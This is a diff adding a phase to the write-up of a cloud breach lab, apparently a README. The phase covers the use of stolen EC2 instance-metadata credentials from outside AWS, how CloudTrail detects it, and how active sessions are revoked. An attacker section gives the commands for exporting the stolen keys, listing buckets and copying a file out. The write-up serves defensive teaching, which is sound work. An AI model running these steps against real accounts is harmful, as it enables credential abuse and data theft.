@@ -140,3 +140,85 @@ aws s3 rm s3://breach-lab-data-<suffix>/backdoor.txt
 # 2. Uncomment aws_iam_policy.ec2_s3_policy in main.tf
 # 3. Run: terraform apply
 ```
+
+---
+
+## Phase 6 — External Credential Use (Simulated)
+
+> This phase documents what happens after IMDS credentials are
+> harvested and used from an external machine. Simulated based
+> on known CloudTrail behavior — not executed due to lab teardown.
+
+### What the attacker does
+
+After harvesting credentials from Phase 3, an attacker copies
+the three values (AccessKeyId, SecretAccessKey, Token) to their
+own machine and runs:
+```bash
+# Set stolen credentials as environment variables
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="IQoJ..."
+
+# Confirm identity — still shows EC2 role ARN
+aws sts get-caller-identity
+
+# Enumerate buckets from external IP
+aws s3 ls
+
+# Exfiltrate from data bucket
+aws s3 cp s3://breach-lab-data-<suffix>/testfile.txt ./stolen.txt
+```
+
+### What CloudTrail would show
+
+Two events from the same IAM role ARN but different source IPs:
+
+| Event | Source IP | Meaning |
+|-------|-----------|---------|
+| Actions inside EC2 | 18.x.x.x (AWS internal) | Normal instance activity |
+| Actions from laptop | your.home.ip | Credential exfiltration confirmed |
+
+The source IP change on the same role ARN is the primary
+detection signal. Same identity, different location — that
+is the anomaly.
+
+### How to detect it
+```bash
+# Filter CloudTrail for the EC2 role
+aws cloudtrail lookup-events \
+  --lookup-attributes \
+  AttributeKey=Username,AttributeValue=breach-lab-ec2-role \
+  --query 'Events[*].{Time:EventTime,Event:EventName}' \
+  --output table
+
+# In raw log files, look for sourceIPAddress changes
+cat trail.json | python3 -m json.tool | grep sourceIPAddress
+```
+
+### How to respond (credential revocation)
+
+Once external use is confirmed via source IP change, revoke
+all active sessions immediately without rotating the role:
+```bash
+aws iam put-role-policy \
+  --role-name breach-lab-ec2-role \
+  --policy-name RevokeAllSessions \
+  --policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Deny",
+      "Action": "*",
+      "Resource": "*",
+      "Condition": {
+        "DateLessThan": {
+          "aws:TokenIssueTime": "<timestamp-of-compromise>"
+        }
+      }
+    }]
+  }'
+```
+
+This invalidates all tokens issued before the compromise
+timestamp. The role itself is untouched — only active
+sessions are killed.
